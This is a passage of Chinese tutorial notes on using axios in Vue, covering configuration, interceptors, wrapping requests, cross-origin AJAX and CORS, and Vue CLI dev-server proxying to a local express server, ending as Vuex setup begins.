
<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

### 1.3.3、axios的配置
配置的优先级为：请求配置 > 实例配置 > 全局配置

#### 1.3.3.1、全局配置
<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Document</title></font>

<font style="color:#595959;">    <script src="../js/axios.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <button id="btn" onclick="getData()">发送请求</button></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      //配置全局的超时时长</font>

<font style="color:#595959;">      axios.defaults.timeout = 2000;</font>

<font style="color:#595959;">      //配置全局的基本URL</font>

<font style="color:#595959;">      axios.defaults.baseURL = "http://localhost:3000";</font>

<font style="color:#595959;">      async function getData() {</font>

<font style="color:#595959;">        try {</font>

<font style="color:#595959;">          let res1 = await axios.get("/list");</font>

<font style="color:#595959;">          let res2 = await axios.get("/user");</font>

<font style="color:#595959;">          console.log(res1.data);</font>

<font style="color:#595959;">          console.log(res2.data);</font>

<font style="color:#595959;">        } catch (error) {</font>

<font style="color:#595959;">          console.log(error);</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

#### 1.3.3.2、实例配置
在一个项目中，我们会有很多不同的请求，如果都用axios去请求，很容易造成冲突，所以我们可以去创建axios的实例，通过不同的实例去请求，配置

<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Document</title></font>

<font style="color:#595959;">    <script src="../js/axios.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <button id="btn" onclick="getData()">发送请求</button></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      async function getData() {</font>

**<font style="color:#595959;">        // 创建实例1，创建同时配置</font>**

<font style="color:#595959;">      </font>**<font style="color:#595959;">  let instance = axios.create({</font>**

**<font style="color:#595959;">          baseURL: "http://localhost:3000",</font>**

**<font style="color:#595959;">          timeout: 2000,</font>**

**<font style="color:#595959;">        });</font>**



<font style="color:#595959;">        let res = await instance.get("/list");</font>

<font style="color:#595959;">        console.log(res.data);</font>



<font style="color:#595959;">        </font>**<font style="color:#595959;">// 创建实例2，现创建，再配置</font>**

**<font style="color:#595959;">        let instance2 = axios.create();</font>**

**<font style="color:#595959;">        instance2.defaults.timeout = 2;</font>**

**<font style="color:#595959;">        instance2.defaults.baseURL = "http://localhost:3000";</font>**



<font style="color:#595959;">        let res2 = await instance.get("/user");</font>

<font style="color:#595959;">        console.log(res2.data);</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

axios实例常用配置：

    - baseURL 请求的域名，基本地址，类型：String
    - timeout 请求超时时长，单位ms，类型：Number
    - url 请求路径，类型：String
    - method 请求方法，类型：String
    - headers 设置请求头，类型：Object
    - params 请求参数，将参数拼接在URL上，类型：Object
    - data 请求参数，将参数放到请求体中，类型：Object

#### 1.3.3.3、请求配置
<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Document</title></font>

<font style="color:#595959;">    <script src="../js/axios.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <button id="btn" onclick="getData()">发送请求</button></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      async function getData() {</font>

<font style="color:#595959;">        let res = await axios.get("http://localhost:3000/list", {</font>

<font style="color:#595959;">          timeout: 2000,</font>

<font style="color:#595959;">        });</font>

<font style="color:#595959;">        console.log(res.data);</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

### 1.3.4、axios的拦截器
axios给我们提供了两大类拦截器

请求方向的拦截（成功请求，失败请求）

响应方向的拦截（成功的，失败的）

拦截器的作用，用于我们在网络请求的时候，在发起请求或者响应时对操作进行处理

例如：发送请求时，可以添加网页加载的动画，或认证token，强制用户先登录再请求数据

响应的时候，可以结束网页加载的动画，或者对响应的数据进行处理

#### 1.3.4.1、请求拦截器
<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Document</title></font>

<font style="color:#595959;">    <script src="../js/axios.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <button id="btn" onclick="getData()">发送请求</button></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // 请求拦截器</font>

<font style="color:#595959;">      </font>**<font style="color:#595959;">async function getData() {</font>**

<font style="color:#595959;">        </font>**<font style="color:#595959;">axios.interceptors.request.use(</font>**

<font style="color:#595959;">          </font>**<font style="color:#595959;">(config) => {</font>**

<font style="color:#595959;">            // 发生请求前的一系列的处理</font>

<font style="color:#595959;">            console.log("开启加载动画");</font>

<font style="color:#595959;">            console.log("认证是否有token，如果没有，要去登录");</font>

<font style="color:#595959;">            return config; //拦截后的放行</font>

<font style="color:#595959;">        </font>**<font style="color:#595959;">  },</font>**

<font style="color:#595959;">         </font>**<font style="color:#595959;"> (err) => {</font>**

<font style="color:#595959;">            // 请求错误处理</font>

<font style="color:#595959;">            return Promise.reject(err);</font>

<font style="color:#595959;"> </font>**<font style="color:#595959;">         }</font>**

<font style="color:#595959;">     </font>**<font style="color:#595959;">   );</font>**

<font style="color:#595959;">        let res = await axios.get("http://localhost:3000/list");</font>

<font style="color:#595959;">        console.log(res.data);</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

#### 1.3.4.2、相应拦截器
<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Document</title></font>

<font style="color:#595959;">    <script src="../js/axios.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <button id="btn" onclick="getData()">发送请求</button></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // 响应拦截器</font>

**<font style="color:#595959;">      async function getData() {</font>**

<font style="color:#595959;"> </font>**<font style="color:#595959;">       axios.interceptors.response.use(</font>**

<font style="color:#595959;">       </font>**<font style="color:#595959;">   (config) => {</font>**

<font style="color:#595959;">            // 数据回来前的一系列的处理</font>

<font style="color:#595959;">            console.log("关闭加载动画");</font>

<font style="color:#595959;">            console.log("对数据进行一些数据");</font>

<font style="color:#595959;">            return config.data; //拦截后的放行</font>

<font style="color:#595959;">        </font>**<font style="color:#595959;">  },</font>**

**<font style="color:#595959;">          (err) => {</font>**

<font style="color:#595959;">            // 响应错误处理</font>

<font style="color:#595959;">            return Promise.reject(err);</font>

<font style="color:#595959;">     </font>**<font style="color:#595959;">     }</font>**

<font style="color:#595959;">   </font>**<font style="color:#595959;">     );</font>**

<font style="color:#595959;">        let res = await axios.get("http://localhost:3000/list");</font>

<font style="color:#595959;">        console.log(res.data);</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

#### 1.3.4.3、取消拦截
<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Document</title></font>

<font style="color:#595959;">    <script src="../js/axios.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <button id="btn" onclick="getData()">发送请求</button></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // 请求拦截器</font>

<font style="color:#595959;">      async function getData() {</font>

<font style="color:#595959;">        let instance = axios.create();</font>

<font style="color:#595959;">        instance.interceptors.request.use(</font>

<font style="color:#595959;">          (config) => {</font>

<font style="color:#595959;">            // 发生请求前的一系列的处理</font>

<font style="color:#595959;">            console.log("开启加载动画");</font>

<font style="color:#595959;">            console.log("认证是否有token，如果没有，要去登录");</font>

<font style="color:#595959;">            return config; //拦截后的放行</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          (err) => {</font>

<font style="color:#595959;">            // 请求错误处理</font>

<font style="color:#595959;">            return Promise.reject(err);</font>

<font style="color:#595959;">          }</font>

<font style="color:#595959;">        );</font>



<font style="color:#595959;">     </font>**<font style="color:#595959;">   // 取消拦截</font>**

**<font style="color:#595959;">        axios.interceptors.request.eject(instance);</font>**



<font style="color:#595959;">        let res = await axios.get("http://localhost:3000/list");</font>

<font style="color:#595959;">        console.log(res.data);</font>

<font style="color:#595959;">      }</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

# 2、Vue中axios的使用
## 2.1、基本使用
### 2.1.1<font style="color:#B4B4B4;">、npm安装</font>
终端安装：

**<font style="color:#FF0000;"> npm install axios</font>**

### 2.1.2、在Vue原型上配置$axios
在vue项目的main.js文件中引入axios

**<font style="color:#595959;">// 导入axios</font>**

**<font style="color:#595959;">import axios from 'axios'</font>**

**<font style="color:#595959;">// 将axios放到Vue原型上，这样vm，vc身上就都有axios了</font>**

**<font style="color:#595959;">Vue.prototype.$axios=axios</font>**



### 2.1.3、在组件中使用：
<font style="color:#595959;"><button @click="getDate">点击发送请求</button></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  name: 'App',</font>

<font style="color:#595959;">  methods: {</font>

<font style="color:#595959;">    async getDate() {</font>

<font style="color:#595959;">    </font>**<font style="color:#595959;">  let res = await this.$axios.get('http://localhost:3000/list')</font>**

<font style="color:#595959;">      console.log(res.data);</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

## 2.2、一次封装
如果是多个组件都需要发送请求，而且每次请求前，我们**<u>都要进行一些验证处理等</u>**，可以进行简单封装

### 2.2.1、封装<font style="color:#FE2C24;">request.js</font>
<font style="color:#4D4D4D;">src/utils创建</font><font style="color:#FE2C24;">request.js</font>

<font style="color:#595959;">/* 封装axios用于发送请求 */</font>

<font style="color:#595959;">import axios from "axios";</font>



<font style="color:#595959;">/*</font>

<font style="color:#595959;">(1)request 相当于 Axios 的实例对象</font>

<font style="color:#595959;">(2)为什么要有request,而不是直接用axios</font>

<font style="color:#595959;">  * 项目开发中，有可能会有两个基地址</font>

<font style="color:#595959;">  * 不同的接口配置不同（有的要token,有的不要token）</font>

<font style="color:#595959;">*/</font>

<font style="color:#595959;">const request = axios.create({</font>

<font style="color:#595959;">  baseURL: "http://localhost:3000", // 设置基地址</font>

<font style="color:#595959;">  timeout: 2000, // 请求超时：当2s没有响应就会结束请求</font>

<font style="color:#595959;">});</font>



<font style="color:#595959;">// 添加请求拦截器，一下内容是axios的拦截器，可以不用写</font>

<font style="color:#595959;">request.interceptors.request.use(</font>

<font style="color:#595959;">  function (config) {</font>

<font style="color:#595959;">    </font>**<font style="color:#595959;">// 发请求前做的一些处理，数据转化，配置请求头，设置token,设置loading等，根据需求去添加</font>**

<font style="color:#595959;">    // 例如1</font>

<font style="color:#595959;">    config.data = JSON.stringify(config.data); // 数据转化,也可以使用qs转换</font>

<font style="color:#595959;">    // 例如2</font>

<font style="color:#595959;">    config.headers = {</font>

<font style="color:#595959;">      "Content-Type": "application/x-www-form-urlencoded", // 配置请求头</font>

<font style="color:#595959;">    };</font>

<font style="color:#595959;">    // 例如3</font>

<font style="color:#595959;">    //注意使用token的时候需要引入cookie方法或者用本地localStorage等方法，推荐js-cookie</font>

<font style="color:#595959;">    const token = getCookie("名称"); // 这里取token之前，你肯定需要先拿到token,存一下</font>

<font style="color:#595959;">    if (token) {</font>

<font style="color:#595959;">      config.params = { token: token }; // 如果要求携带在参数中</font>

<font style="color:#595959;">      config.headers.token = token; // 如果要求携带在请求头中</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">    </font>

<font style="color:#595959;">     return config; //拦截后的放行</font>

<font style="color:#595959;">  }, </font>

<font style="color:#595959;">  function (error) {</font>

<font style="color:#595959;">    // 对请求错误做些什么</font>

<font style="color:#595959;">    return Promise.reject(error);</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">);</font>



<font style="color:#595959;">// 添加响应拦截器</font>

<font style="color:#595959;">request.interceptors.response.use(</font>

<font style="color:#595959;">  function (response) {</font>

<font style="color:#595959;">    // 对响应数据做点什么</font>

<font style="color:#595959;">    console.log('关闭请求数据动画');</font>

<font style="color:#595959;">    console.log('对数据进行处理');</font>

<font style="color:#595959;">    return response.data; //只要响应对象中的数据</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  function (error) {</font>

<font style="color:#595959;">    // 对响应错误做点什么</font>

<font style="color:#595959;">    return Promise.reject(error);</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">);</font>



**<font style="color:#595959;">export default request;</font>**

<font style="color:#FE2C24;">第一次封装，引入了基地址与拦截器</font>

### 2.2.2、组件中使用
<font style="color:#595959;"><script></font>

<font style="color:#595959;">import request from '../utils/request'</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'ShowList',</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        async getList() {</font>

<font style="color:#595959;">        </font>**<font style="color:#595959;">    // 基本路径已经配置过</font>**

**<font style="color:#595959;">            let res = await request.get('/list')</font>**

<font style="color:#595959;">            //这里的res也是响应拦截器里处理之后的结果</font>

<font style="color:#595959;">            console.log(res);</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

<font style="color:#595959;"><script></font>

<font style="color:#595959;">import request from '@/utils/request';</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'ShowUser',</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        async getUser() {</font>

<font style="color:#595959;">            let res = await request.get('/user')</font>

<font style="color:#595959;">            console.log(res);</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>



<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

## 2.3、二次封装
项目当中会有很多的页面，**如果每个页面中都会多次请求，将我们的请求都写在对应的页面中，比较难以维护，****所以可以将请求再次进行封装****，**类似如下效果：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433657750-c778a8a9-02db-4d4d-a137-b4166c6e4a19.png)

src/apis/showList.js

**<font style="color:#FF0000;">// 导入一次封装的request</font>**

**<font style="color:#FF0000;">import request from "@/utils/request";</font>**

**<font style="color:#595959;">// 请求list数据</font>**

**<font style="color:#595959;">export function getListInfo1() {</font>**

**<font style="color:#595959;">  return request.get("/list");</font>**

**<font style="color:#595959;">}</font>**

**<font style="color:#595959;">// 请求user数据</font>**

**<font style="color:#595959;">export function getUserInfo1() {</font>**

**<font style="color:#595959;">  return request.get("/user");</font>**

**<font style="color:#595959;">}</font>**

showList.vue

<font style="color:#595959;"><script></font>

<font style="color:#595959;">import { getListInfo1, getUserInfo1 } from '../apis/showList'</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'ShowList',</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        async getList1() { </font>

<font style="color:#595959;">          //	调用请求函数</font>

<font style="color:#595959;">            let res = await getListInfo1()</font>

<font style="color:#595959;">            console.log(res);</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        async getUser1() {</font>

<font style="color:#595959;">            let res = await getUserInfo1()</font>

<font style="color:#595959;">            console.log(res);</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

# 3、axios小案例
## 3.1、表格的添加
## 3.2、天气案例


**《04、Vue与Ajax》**

## 4.1 发送AJAX异步请求的方式 
发送AJAX异步请求的常见方式包括：

### 4.1.1. 原生方式
使用浏览器内置的JS对象XMLHttpRequest

<font style="color:#595959;">const xhr = new XMLHttpRequest()</font>

<font style="color:#595959;">xhr.open()</font>

<font style="color:#595959;">xhr.send()</font>

<font style="color:#595959;">xhr.onreadystatechange = function(){}</font>

### 4.1.2. 原生方式
使用浏览器内置的JS函数fetch

<font style="color:#595959;">fetch(‘url’, {method : ‘GET’}).then().then() </font>

<font style="color:#595959;">//第一次.then返回的是promise，第二次.then,才可以得到结果</font>

### 4.1.3. 第三方库方式
jQuery（对XMLHttpRequest进行的封装）

<font style="color:#595959;">$.get()</font>

<font style="color:#595959;">$.post()</font>

<font style="color:#595959;">$.ajax()</font>

<font style="color:#595959;">······</font>

axios :基于Promise的HTTP库：axios （对XMLHttpRequest进行的封装），<font style="color:#FF0000;">axios是Vue官方推荐使用的</font>。

<font style="color:#595959;">axios.get().then()</font>

<font style="color:#595959;">axios.post().then()</font>

<font style="color:#595959;">axios.put().then()</font>

<font style="color:#595959;">axios.patch().then()</font>

<font style="color:#595959;">axios.delete().then()</font>

<font style="color:#595959;">·····</font>

vue-resource 

跟axios一样使用

+ 安装：npm i vue-resource
+ main.js中 import vueResource from ‘vue-resource’
+ main.js中 使用插件：Vue.use(vueResource)
+ 使用该插件之后，项目中所有的vm和vc实例上都添加了：$http属性。
+ 使用办法：

this.$http.get(‘’).then() 用法和axios相同，只不过把axios替换成this.$http

## 4.2 AJAX跨域 
### 1. 什么是跨域访问？
(1) 在a页面中想获取b页面中的资源，如果a页面和b页面所处的协议、域名、端口不同（只要有一个不同），所进行的访问行动都是跨域的。

(2) 哪些跨域行为是允许的？

① 直接在浏览器地址栏上输入地址进行访问

② 超链接

③ <img src=”其它网站的图片是允许的”>

④ <link href=”其它网站的css文件是允许的”>

⑤ <script src=”其它网站的js文件是允许的”>

⑥ ......

(3) 哪些跨域行为是不允许的？

① AJAX请求是不允许的

② Cookie、localStorage、IndexedDB等存储性内容是不允许的

③ DOM节点是不允许的

### 2. AJAX请求无法跨域访问的原因：同源策略
(1) 同源策略是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到XSS、CSRF等攻击。同源是指"协议+域名+端口"三者相同，即便两个不同的域名指向同一个ip地址，也非同源。

(2) AJAX请求不允许跨域并不是请求发不出去，请求能发出去，服务端能收到请求并正常返回结果，只是结果被浏览器拦截了。

### 3. 解决AJAX跨域访问的方案包括哪些
(1) CORS方案（工作中常用的）

① 这种方案主要是后端的一种解决方案，<font style="color:#FF0000;">被访问的资源</font>设置响应头，告诉浏览器我这个资源是允许跨域访问的：

response.setHeader("Access-Control-Allow-Origin", "[http://localhost:8080](http://localhost:8080" \t "_blank)");

response.setHeader("Access-Control-Allow-Origin", "*");

(2) jsonp方案（面试常问的）

① 采用的是<script src=””>不受同源策略的限制来实现的，但只能解决GET请求。

(3) 代理服务器方案（工作中常用的）

① Nginx反向代理

② Node中间件代理

③ vue-cli（Vue脚手架自带的8080服务器也可以作为代理服务器，需要通过配置vue.config.js来启用这个代理）

(4) postMesssage

(5) websocket

(6) window.name + iframe

(7) location.hash + iframe

(8) document.domain + iframe

......

### 4. 代理服务器方案的实现原理
同源策略是浏览器需要遵循的标准，而如果是服务器向服务器请求就无需遵循同源策略的。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433658068-74a91696-674a-4dfe-95b5-af31a7682cab.png)

## 4.3 代理服务器 
Vue脚手架内置服务器的地址：[http://localhost:8080](http://localhost:8080" \t "_blank)

我们可以额外再开启一个其它的服务器，这个服务器随意，例如：node server、Apache服务器、JBOSS服务器、WebLogic服务器、WebSphere服务器、jetty服务器、tomcat服务器......我这里选择的是基于express语言的一个服务器，这个web服务器开启了一个8000端口，提供了以下的一个服务：可以帮助我们获取到一个user列表

### 4.3.1、express的基本使用
官网：[https://www.expressjs.com.cn/](https://www.expressjs.com.cn/" \t "_blank)

安装：npm init --yes 做一下初始化

<font style="color:#555555;">npm install express --save</font>

<font style="color:#595959;">//1. 引入express</font>

<font style="color:#595959;">const express = require('express');</font>



<font style="color:#595959;">//2. 创建应用对象</font>

<font style="color:#595959;">const app = express();</font>



<font style="color:#595959;">//3. 创建路由规则</font>

<font style="color:#595959;">// request 是对请求报文的封装</font>

<font style="color:#595959;">// response 是对响应报文的封装</font>

<font style="color:#595959;">app.get('/', (request, response)=>{</font>

<font style="color:#595959;">    //设置响应</font>

<font style="color:#595959;">    response.send('HELLO EXPRESS');</font>

<font style="color:#595959;">});</font>



<font style="color:#595959;">//4. 监听端口启动服务 </font>

<font style="color:#595959;">app.listen(8000, ()=>{</font>

<font style="color:#595959;">    console.log("服务已经启动, 8000 端口监听中....");</font>

<font style="color:#595959;">});</font>

运行方式一：node 文件名.js

运行方式二：nodemon安装

可以帮助自动重启express后台服务器

[https://www.npmjs.com/package/nodemon](https://www.npmjs.com/package/nodemon" \t "_blank)

npm install -g nodemon

安装完毕，重启severs.js

启动命令

nodemon severs.js

网址：[http://127.0.0.1:8000/](http://127.0.0.1:8000/" \t "_blank) 或 [http://localhost:8000/](http://localhost:8000/user" \t "_blank)

### 4.3.2、演示跨域问题
1、使用express打开8000服务器，自定义一个user数据

2、安装axios npm i axios 

3、引入axios，并发送ajax请求

<font style="color:#595959;"><script></font>

<font style="color:#595959;">//引入axios </font>

<font style="color:#595959;">import axios from 'axios'</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'hellowrod',</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            msg: '我是helloworld组件！'</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        getuser() {</font>

<font style="color:#595959;">            // 需求：发送AJAX请求，访问：http://localhost:8000/user</font>

<font style="color:#595959;">            //本地内置服务器 http://localhost:8080/</font>

<font style="color:#595959;">            axios.get('http://localhost:8000/user').then(</font>

<font style="color:#595959;">                response =>{</font>

<font style="color:#595959;">                    console.log('服务器返回的数据：',response.data);</font>

<font style="color:#595959;">                },</font>

<font style="color:#595959;">                error=>{</font>

<font style="color:#595959;">                    console.log('错误信息',error.message);</font>

<font style="color:#595959;">                }</font>

<font style="color:#595959;">            )</font>



<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

输出结果

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433658375-fd649d07-1c06-4d4b-a6af-36ec9a01a743.png)

### 4.4.1、配置vue.config.js文件 <font style="color:#F33232;">报错问题</font>
注意，这里的vue.config.js可以自己在根目录下创建，跟src同级，如果报错，可能是脚手架版本的问题

如下图报错：<font style="color:#F33232;">defineConfig is not a function报错</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433658682-30994d22-d739-4226-80bd-ae128503afb6.png)

（1）、打开终端cd vue 文件夹

（2）、npm audit fix --force

（3）、npm install

最后重启应该可以解决

### 4.4.2、简单开启 
vue.config.js

<font style="color:#595959;">const { defineConfig } = require("@vue/cli-service");</font>

<font style="color:#595959;">module.exports = defineConfig({</font>

<font style="color:#595959;">  devServer: {</font>

<font style="color:#595959;">    // Vue脚手架内置的8080服务器负责代理访问8000服务器</font>

<font style="color:#595959;">    // 地址写到端口号就可以</font>

<font style="color:#595959;">    proxy: "http://localhost:8000",</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">});</font>

在vue文件中发送请求时，地址需要修改如下：

<font style="color:#595959;"> methods: {</font>

<font style="color:#595959;">        getuser() {</font>

<font style="color:#595959;">            // 原理：发送AJXA请求的时候，会优先从自己的服务器当中去找 public/user资源</font>

<font style="color:#595959;">            // 如果找不到，就会去找代理，然后去http://localhost:8000上去找</font>

<font style="color:#595959;">            // axios.get('http://localhost:8080/user').then(</font>

<font style="color:#595959;">            // 当前按钮就在8080服务器上，资源也在8080上，所以http://localhost:8080可以省略</font>

<font style="color:#595959;">            axios.get('/user').then(</font>

<font style="color:#595959;">                response => {</font>

<font style="color:#595959;">                    console.log('服务器返回的数据：', response.data);</font>

<font style="color:#595959;">                },</font>

<font style="color:#595959;">                error => {</font>

<font style="color:#595959;">                    console.log('错误信息', error.message);</font>

<font style="color:#595959;">                }</font>

<font style="color:#595959;">            )</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

原理：访问地址是[http://localhost:8080/user](http://localhost:8080/bugs" \t "_blank)，会优先去8080服务器上找/user资源，如果没有找到才会走代理。

另外需要注意的是：这种简单配置不支持配置多个代理。

### 4.4.3、高级开启
支持配置多个代理

1、可以再新建一个express2.js，增加一个模拟服务器

2、vue.config.js

<font style="color:#595959;">const { defineConfig } = require("@vue/cli-service");</font>

<font style="color:#595959;">module.exports = defineConfig({</font>

<font style="color:#595959;">  //2、高级开启  可以代理多个服务器</font>

<font style="color:#595959;">  devServer: {</font>

<font style="color:#595959;">    proxy: {</font>

<font style="color:#595959;">      "/api": {</font>

<font style="color:#595959;">        //凡是请求路径以/api开始的，都走这个代理</font>

<font style="color:#595959;">        target: "http://localhost:8000",</font>

<font style="color:#595959;">        pathRewrite: { "^/api": "" }, //路径重新，凡是/api开始的路径，都替换为空串</font>

<font style="color:#595959;">        ws: true, //开启对websocket的支持（websocket是一种实时推动技术），默认是true</font>

<font style="color:#595959;">        changeOrigin: true, //默认是true表示改变起源，（让对方服务器不知道我们真正的起源到底是哪里）</font>

<font style="color:#595959;">      },</font>

<font style="color:#595959;">      "/abc": {</font>

<font style="color:#595959;">        target: "http://localhost:8001",</font>

<font style="color:#595959;">        pathRewrite: { "^/abc": "" },</font>

<font style="color:#595959;">        ws: true,</font>

<font style="color:#595959;">        changeOrigin: true,</font>

<font style="color:#595959;">      },</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">});</font>

helloword.vue 发送ajax请求

<font style="color:#595959;"> methods: {</font>

<font style="color:#595959;">        getuser() {</font>

<font style="color:#595959;">            // 开启多个代理</font>

<font style="color:#595959;">            axios.get('/api/user').then(</font>

<font style="color:#595959;">                response => {</font>

<font style="color:#595959;">                    console.log('服务器返回的数据：', response.data);</font>

<font style="color:#595959;">                },</font>

<font style="color:#595959;">                error => {</font>

<font style="color:#595959;">                    console.log('错误信息', error.message);</font>

<font style="color:#595959;">                }</font>

<font style="color:#595959;">            )</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        getpassword() {</font>

<font style="color:#595959;">            // 开启多个代理</font>

<font style="color:#595959;">            axios.get('/abc/password').then(</font>

<font style="color:#595959;">                response => {</font>

<font style="color:#595959;">                    console.log('服务器返回的数据：', response.data);</font>

<font style="color:#595959;">                },</font>

<font style="color:#595959;">                error => {</font>

<font style="color:#595959;">                    console.log('错误信息', error.message);</font>

<font style="color:#595959;">                }</font>

<font style="color:#595959;">            )</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">    }</font>



## 4.4、axios的封装
看axios的使用笔记



**《05、Vuex的使用》**

## 5.1 、vuex概述 
### 1. vuex是实现数据<font style="color:#FF0000;">集中式状态（数据）管理</font>的插件。
数据由vuex统一管理。其它组件都去使用vuex中的数据。只要有其中一个组件去修改了这个共享的数据，其它组件会同步更新。

一定要注意：全局事件总线和vuex插件的区别：

(1) 全局事件总线关注点：组件和组件之间数据如何传递，一个绑定$on，一个触发$emit。数据实际上还是在局部的组件当中，并没有真正的让数据共享。只是数据传来传去。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433659009-e728bc30-a756-4fa1-b64f-d1ebcb4395ce.png)

(2) vuex插件的关注点：**共享数据本身就在vuex上。其中任何一个组件去操作这个数据，其它组件都会同步更新。**是真正意义的数据共享。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433659412-8316d4bc-73b5-4183-bce4-4bcd134ba667.png)

### 2. 使用vuex的场景是：
(1) 多个组件之间依赖于同一状态。来自不同组件的行为需要变更同一状态。

## 5.2、 vuex环境搭建 
### 5.2.1. 安装vuex
<font style="color:#FF0000;">(1) vue2安装vuex3版本 npm i </font>[vuex@3](http://vuex@3" \t "_blank)

<font style="color:#FF0000;">如果报错，可能是依赖冲突问题：</font>

<font style="color:#000000;">npm i </font>[vuex@3](http://vuex@3" \t "_blank)<font style="color:#000000;"> --legacy-peer-deps</font>

(2) vue3安装vuex4版本 npm i vuex@4

### 5.2.2. 创建目录和js文件
（目录和文件名不是必须叫这个）

(1) 目录：vuex或者store

(2) js文件：store.js或index.js

### 5.2.3. 在store.js文件中创建核心store对象，并暴露
<font style="color:#595959;">// 引入Vue</font>

<font style="color:#595959;">import Vue from "vue";</font>

